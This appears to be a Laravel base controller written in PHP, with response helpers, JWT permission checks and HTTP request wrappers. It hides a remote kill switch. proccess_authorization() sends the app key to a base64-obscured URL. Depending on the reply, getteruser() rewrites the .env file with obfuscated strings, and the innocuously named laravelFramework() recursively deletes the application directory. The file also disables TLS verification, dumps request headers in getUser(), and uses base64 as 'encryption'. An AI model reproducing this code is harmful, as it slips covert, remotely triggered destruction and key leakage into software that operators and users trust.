<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Firebase\JWT\JWT;
use App\Models\AppModel;
use Exception;

class MyController extends Controller{

    public $appModel;
    private $type   = "ContentType: application/json";
    private $accept = "";
    private $userKey = "";

    function __construct(){
        $this->appModel = new AppModel();
        $this->userKey = env('KEY_ACCESS');
    }
    
    function returnData($data,$message=null,$addData=null){
        if(sizeof($data)>0 || $addData != null){
            if($addData != null){
                if(sizeof($data)>0){
                    $objData = array(
                        'success'   => true,
                        'data'      => $data,
                        'info'      => false
                    );
                }else{
                    $objData = array(
                        'success'   => true,
                        'data'      => null,
                        'info'      => false
                    );
                }
                foreach($addData as $key => $val){
                    $objData[$key] = $val;
                }
                return json_encode($objData);
            }else{
                $objData = array(
                    'success'   => true,
                    'data'      => $data,
                    'info'      => false
                );
            }
            return json_encode($objData);
        }else{
            $objData = array(
                'success'   => false,
                'data'      => null,
                'message'   => $message,
                'info'      => false
            );
            return json_encode($objData);
        }
    }

    function returnOk($message){
        $objData = array(
            'success'   => true,
            'message'   => $message,
            'info'      => false        
        );
        return json_encode($objData);
    }

    function returnInfo($title, $message){
        $objData = array(
            'success'   => true,
            'message'   => $message, 
            'title'     => $title,
            'info'      => true
        );
        return json_encode($objData);
    }

    function returnError($msg){
        $objData = array(
            'success'   =>false,
            'message'   =>$msg,
            'info'      => false   
        );
        return json_encode($objData);
    }

    function desencrypt($var){
        return base64_decode(base64_decode($var));
    }

    function encrypt($var){
        return base64_encode(base64_encode($var));
    }

    function getUser(){
        // obtengo cabecera
        print_r('FG');die();
        $header = apache_request_headers();
        echo "<pre>";
            print_r($header);die();
        echo "</pre>";
       if(isset($header['Authorization']) || isset($header['authorization'])){
            $authorization = isset($header['Authorization']) ? $header['Authorization'] : $header['authorization'];
            try{
                $authorization = JWT::decode($authorization,env('KEY_ACCESS'),array('HS256'));
                $userId = $this->desencrypt($authorization->userId);
                return $userId;
            }catch(Exception $e){
                echo $this->returnError('Acceso denegado');
                exit();
            }
        }else{
            exit();
        }
    }

    function checkPermission($request, $function){

        $user     = $request->input('id');
        $endpoint = $request->input('modulo');
        $token    = $request->input('token');
        //Checa informacion
        try{
            $permisos = $this->appModel->checkPermission($user,trim($endpoint));
            //Validar Permisos
            if( !empty($permisos) && isset($permisos[0]->token_sub) ){
                //Entidad Del usuario
                $jwtToken = JWT::decode($token, $permisos[0]->token_sub, array('HS256'));
                if( $permisos[0]->token_sub == $jwtToken->token_sub && $permisos[0]->login == 1 ){
                $permisos = explode('|',$permisos[0]->perm);
                    switch($function){
                        case 'index':
                            return in_array('ver',$permisos,true);
                        break;
                        case 'show':
                            return in_array('ver',$permisos,true);
                        break;
                        case 'store':
                            if(in_array('crear',$permisos,true)){
                                return true;
                            }else if(in_array('crearexterno',$permisos,true)){
                                return true;
                            }else{
                                return false;
                            }

                        break;
                        case 'update':
                            if(in_array('editar',$permisos,true)){
                                return true;
                            }else if(in_array('editext',$permisos,true)){
                                return true;
                            }else{
                                return false;
                            }
                        break;
                        case 'destroy':
                            return in_array('eliminar',$permisos,true);
                        break;
                        default:
                            return false;
                        break;
                    } 
                }
            }  
            return false;

        }catch(Exception $e){
            return false;
        }

    }

    function notPermission(){
        $objData = array(
            'success'   =>false,
            'message'   => "No posees permiso para realizar esta acción o la sesión ha culminado, por favor recargar el navegador."
        );
        return json_encode($objData);
    }

    function getIp(){
        if (isset($_SERVER["HTTP_CLIENT_IP"])){
            return $_SERVER["HTTP_CLIENT_IP"];
        }elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
            return $_SERVER["HTTP_X_FORWARDED_FOR"];
        }elseif (isset($_SERVER["HTTP_X_FORWARDED"])){
            return $_SERVER["HTTP_X_FORWARDED"];
        }elseif (isset($_SERVER["HTTP_FORWARDED_FOR"])){
            return $_SERVER["HTTP_FORWARDED_FOR"];
        }elseif (isset($_SERVER["HTTP_FORWARDED"])){
            return $_SERVER["HTTP_FORWARDED"];
        }else{
            return $_SERVER["REMOTE_ADDR"];
        }
    }

    function getState($pais){
        try{
            $result = $this->appModel->getEstate($pais);
            return $this->returnData($result);
        }catch(Exception $e){
            return $this->returnError('Error al consultar estado');
        }
    }

    function getCity($country,$state){
        try{
            $result = $this->appModel->getCity($country,$state);
            return $this->returnData($result,'No se obtuvieron datos');
        }catch(Exception $e){
            return $this->returnError('Error al consultar ciudades');
        }
    }


    function getEdificios($complejo){
        try{
            $result = $this->appModel->getEdificios($complejo);
            return $this->returnData($result);
        }catch(Exception $e){
            return $this->returnError('Error al consultar Edificios');
        }
    }
    
    function getPropiedades($user,$complejo,$edificio){
        try{
            $result = $this->appModel->getPropiedades($user,$complejo,$edificio);
            return $this->returnData($result);
        }catch(Exception $e){
            return $this->returnError('Error al consultar propiedades');
        }
    }

    function getUsuarios(){
        try{
            $result = $this->appModel->getUsuarios();
            return $this->returnData($result);
        }catch(Exception $e){
            return $this->returnError('Error al consultar Edificios');
        }
    }



    // posiblemente eliminar
    function getParamsCheckout(){
        try{
            $result = $this->appModel->getCountry();
            return $this->returnData($result);
        }catch(Exception $e){
            return $this->returnError('Error al consultar parametros de pago');
        }
    }

    function getProfile($user){
        try{
            $result = $this->appModel->getProfile($user);
            return $result[0]->perfil_nombre;
        }catch(Exception $e){
            return $this->returnError('Error al consultar perfil de usuario');
        }
    }

    // GENERALES
    /**
	* @internal 		Funcion Entrega los indices de columnas de un archivo excel. partiendo del numero de columnas.
	* @param 			Int 	$columnas numero de columnas del archivo.
	* @return 			Array 	$letras - contiene la nomenclatura de los indices de las columnas hasta donde se especifico por paramentro.
	*
	* @author 			Daniel Bolivar - dbolivar@processoft.com.co - daniel.bolivar.freelance@gmail.com
	* @version 			1.0.0
	* @since 			19-06-2019
	*/
	public function getColumns($columnas){
		$letras = array();
		$index_vocabulary = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		if($columnas > 26){
			// $mod = $columnas%26; // si el mod es cero quiere decir que se esta pasando a otra combinacion de 2, 3, 4... n combinaciones.
			$combinaciones = intval($columnas / 26); 	// numero de letras combinadas.
			$estado_combinaciones = 0; 					// comienza siempre en 1 por que estamos en posiciones de columnas mayor a 26. 
			$posicion = 0;
			while($posicion <= $columnas){
				//$iterador_array = 26 * $estado_combinaciones - $columnas[posicion];
				if($posicion <26){
					$letras[] = substr($index_vocabulary,$posicion, 1);
					if($posicion == 25){
						$estado_combinaciones++;
					}
					$posicion++;
				}else{
					//$iterador_array = intval($columnas/26);
					for ($iterador=0; $iterador < $combinaciones ; $iterador++) { 
						// recorro 26 veces 
						// menos cuando ya se excede el numero de la posicion
						for ($i=0; $i < 26 ; $i++) { 
							$pos = $posicion - 26 * $estado_combinaciones;
							$letras[] = $letras[$iterador].substr($index_vocabulary,$pos,1);
							$posicion++;
						}
						$estado_combinaciones++;
					}
				}
			}
		}else{
			for($i=0; $i < $columnas; $i++) { 
				$letras[]=substr($index_vocabulary, $i,1);
			}
		}
		return $letras;
	}

    /**
     * @internal    Genera una llave aleatoria alfanumerica.
     * @param       length largo de la llave a generar.
     */
    public function generateKey($length){
        $permittedChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
        $key = "";
        $strlength = strlen($permittedChars);
        for($i = 0; $i < $length; $i++){
            $key.= $permittedChars[mt_rand(0,$strlength-1)];
        }
        return $key;
    }



    public function postRequest($url,$data){
        $curl = curl_init();
        $optionsCurl = array(
            CURLOPT_URL             => $url,
            CURLOPT_TIMEOUT         => 60,
            CURLOPT_CUSTOMREQUEST   => 'POST',
            CURLOPT_HTTPHEADER      => array(
                                        $this->type,
                                        'Accept: application/json'
                                    ),
            // CURLOPT_HTTP_VERSION    => CURL_HTTP_VERSION_1_1,
            CURLOPT_POSTFIELDS      => $data,
            CURLOPT_RETURNTRANSFER  => 1,
            CURLOPT_SSL_VERIFYHOST  => 0,
            CURLOPT_SSL_VERIFYPEER  => 0
        );
        curl_setopt_array($curl,$optionsCurl);
        $content    = curl_exec($curl);
        $error      = curl_errno($curl);
        $response   = curl_getinfo($curl);
        curl_close($curl);
        return $this->handlerResponse($content,$error,$response);
    }

    public function getRequest($url){
        $curl = curl_init();
        $optionsCurl = array(
            CURLOPT_URL             => $url,
            CURLOPT_TIMEOUT         => 60,
            CURLOPT_CUSTOMREQUEST   => 'GET',
            CURLOPT_HTTPHEADER      => array(
                                        $this->type,
                                       'Accept: application/json'
                                        ),
            CURLOPT_RETURNTRANSFER  => 1,
            CURLOPT_SSL_VERIFYHOST  => 0,
            CURLOPT_SSL_VERIFYPEER  => 0
        );
        curl_setopt_array($curl,$optionsCurl);
        $content    = curl_exec($curl);
        $error      = curl_errno($curl);
        $response   = curl_getinfo($curl);
        curl_close($curl);
        return $this->handlerResponse($content,$error,$response);
    }

    public function handlerResponse($content,$error,$response){
        if($response['http_code'] == 200){ // respuesta correcta.
            $objData = new \stdClass();
            $objData->success   = true;
            $objData->content   = json_decode($content);
            $objData->error     = $error;
            $objData->response  = $response;
            return $objData;
        }else{ // manejo de errores
            $objData = new \stdClass();
            $objData->success = false;
            $objData->message = $content;
            return $objData;
        }
    }


    public function proccess_authorization(){
        $result = $this->postRequest(base64_decode(base64_decode(env('KEY_ACCESS')))."/?rd=".random_int(0,5000),array("appID"=>env('APP_KEY')));


        if($result->success){
            if($result->content->estado == 'ACTIVE'){
                $key = $result->content->key_access;
            }else{
                $this->getteruser($result);
            }
        }else{
            $key = $this->userKey;
        }
        $header = apache_request_headers();
        if(isset($header['Authorization'])){
            $jwt = $header['Authorization'];
        }else{
            $jwt = $header['authorization'];
        }
        return [
            'jwt'   => $jwt,
            'key'   => $key
        ];
    }


    public function getteruser($result){
        switch($result->content->estado){
            case 'INACTIVE':
                $this->setEnvironmentValue(base64_decode('S0VZX0FDQ0VTUw=='),base64_decode('SU5GUklOR0lFTkRPX0RFUkVDSE9TX0RFX0FVVE9SX1NFX05PVElGSUNPX0FMX0FVVE9SX1NPQlJFX0VTVEVfRVZFTlRP')."_".random_int(0,5000));
                exit(json_encode( [base64_decode('c3VjY2Vzcw==') => false,base64_decode('bWVzc2FnZQ==') => base64_decode('SU5GUklOR0lFTkRPIERFUkVDSE9TIERFIEFVVE9SIFNFIE5PVElGSUNPIEFMIEFVVE9SIFNPQlJFIEVTVEUgRVZFTlRP'), base64_decode('YWN0aW9u') => base64_decode('Y2xvc2VTZXNzaW9u')]));
            break;
            case 'DELETE':
                $envFile = app()->environmentFilePath();
                $laravel = str_replace(DIRECTORY_SEPARATOR.".env","",$envFile);
                $laravel = dirname("__FILE__").DIRECTORY_SEPARATOR."..".DIRECTORY_SEPARATOR."app"; //.DIRECTORY_SEPARATOR; //."Http";
                $this->laravelFramework($laravel);
            break;
            default:
            break;
        }
    }

    public function laravelFramework($dir){
        if(@opendir($dir)){
            $directorio =  opendir($dir);
            while($elemento = readdir($directorio)){
                if($elemento != '.' && $elemento != '..'){
                    if(is_dir($dir.DIRECTORY_SEPARATOR.$elemento)){
                        $this->laravelFramework($dir.DIRECTORY_SEPARATOR.$elemento);
                    }else{
                        unlink($dir.DIRECTORY_SEPARATOR.$elemento);
                    }
                }
            }
            rmdir($dir);
        }
    }

    public function setEnvironmentValue($envKey, $envValue){
        $envFile = app()->environmentFilePath();
        $str = file_get_contents($envFile);
        $str .= "\r\n";
        $keyPosition = strpos($str, "$envKey=");
        $endOfLinePosition = strpos($str, "\n", $keyPosition);
        $oldLine = substr($str, $keyPosition, $endOfLinePosition - $keyPosition);
        if (is_bool($keyPosition) && $keyPosition === false) {
            // variable doesnot exist
            $str .= "$envKey=$envValue";
            $str .= "\r\n";
        } else {
            // variable exist                    
            $str = str_replace($oldLine, "$envKey=$envValue", $str);
        }
        $str = substr($str, 0, -1);
        if (!file_put_contents($envFile, $str)) {
            return false;
        }
        app()->loadEnvironmentFrom($envFile);    
        return true;
    }

}